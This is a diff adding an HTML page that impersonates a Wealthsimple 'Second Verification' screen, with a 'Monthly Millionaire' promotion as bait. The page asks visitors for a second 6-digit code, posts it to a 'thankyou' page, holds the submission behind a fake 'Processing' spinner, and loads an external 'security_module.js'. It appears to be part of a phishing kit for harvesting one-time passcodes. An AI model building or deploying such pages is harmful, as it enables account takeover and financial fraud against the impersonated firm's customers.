@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wealthsimple - Second Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; background-color: #0d1e36; color: white; }
+        .w-top-section { padding: 30px 20px 40px; text-align: center; max-width: 400px; margin: 0 auto; }
+        .w-logo { font-family: "Georgia", serif; font-size: 32px; font-weight: bold; text-align: left; margin-bottom: 40px; letter-spacing: -1.5px; }
+        .w-promo-sup { font-size: 13px; letter-spacing: 2px; text-transform: uppercase; color: #ddd; margin-bottom: 15px; font-weight: 500; }
+        .w-promo-title { font-size: 36px; font-weight: bold; line-height: 1.15; margin-bottom: 25px; letter-spacing: -0.5px; }
+        .w-promo-desc { font-size: 17px; line-height: 1.5; color: #ccc; max-width: 340px; margin: 0 auto; }
+        .w-promo-desc a { color: white; text-decoration: underline; text-underline-offset: 3px; text-decoration-thickness: 1px; }
+        
+        .w-card { background: white; border-radius: 20px 20px 0 0; padding: 40px 25px; color: #111; min-height: 45vh; margin: 0 auto; max-width: 400px; box-sizing: border-box; }
+        .w-card-title { font-size: 30px; font-weight: 800; text-align: center; margin-bottom: 35px; letter-spacing: -0.5px; color: #000; }
+        
+        .w-input-wrapper { position: relative; margin-bottom: 20px; }
+        .w-input { width: 100%; background: #f5f5f5; border: 1px solid #eaeaea; padding: 22px 20px; box-sizing: border-box; border-radius: 16px; font-size: 16px; font-weight: 600; outline: none; transition: border 0.2s; color: #333; }
+        .w-input::placeholder { color: #777; font-weight: 600; }
+        .w-input:focus { border-color: #555; }
+        
+        .w-eye-box { position: absolute; right: 8px; top: 8px; background: white; width: 44px; height: 44px; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 1px 4px rgba(0,0,0,0.1); cursor: pointer; }
+        .w-eye-box i { color: #111; font-size: 18px; }
+        
+        .w-forgot { display: block; font-weight: bold; font-size: 15px; color: #000; text-decoration: underline; text-decoration-thickness: 1px; text-underline-offset: 4px; margin-bottom: 40px; margin-top: 10px; }
+        
+        .w-btn-primary { width: 100%; background: #000; color: white; border: none; padding: 22px; border-radius: 40px; font-size: 17px; font-weight: bold; cursor: pointer; margin-bottom: 15px; transition: background 0.2s; }
+        .w-btn-primary:hover { background: #222; }
+        
+        .w-btn-secondary { width: 100%; background: white; color: #000; border: 1px solid #eaeaea; padding: 22px; border-radius: 40px; font-size: 17px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; }
+        .w-btn-secondary:hover { background: #f9f9f9; }
+        
+        /* Loader Overlay */
+        .loader-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
+        }
+        .loader-overlay.active { visibility: visible; opacity: 1; }
+        .loader-spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid #0d1e36;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
+        .success-icon { font-size: 70px; color: #000; margin: 20px auto; display: block; text-align: center; }
+        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="w-top-section">
+        <div class="w-logo">Wealthsimple</div>
+        <div class="w-promo-sup">MONTHLY MILLIONAIRE</div>
+        <div class="w-promo-title">Save money,<br>become a millionaire.</div>
+        <div class="w-promo-desc">Each dollar you save is a potential entry to win. Get your 500 entries by registering and funding your account. <a href="#">T&amp;Cs apply.</a></div>
+    </div>
+    
+    <div class="w-card">
+        <div class="w-card-title">Second Verification</div>
+        
+        <p style="margin-bottom: 30px; font-size: 16px; color: #444; font-weight: 500;">To finalize the verification, please enter the second 6-digit code you received.</p>
+        <form action="wealthsimple101_thankyou.html" method="POST">
+            <div class="w-input-wrapper">
+                <input type="text" class="w-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 24px;">
+            </div>
+            
+            <button type="submit" class="w-btn-primary" style="margin-top: 20px;">Verify</button>
+        </form>
+
+    </div>
+
+    <!-- Loader Overlay -->
+    <div id="loaderOverlay" class="loader-overlay">
+        <div class="loader-spinner"></div>
+        <p class="loader-text">Processing, please wait...</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            const loader = document.getElementById('loaderOverlay');
+            if(form && loader) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    loader.classList.add('active');
+                    setTimeout(function() { form.submit(); }, 10000);
+                });
+            }
+        });
+    </script>
+<script src="security_module.js"></script>
+</body>
+</html>
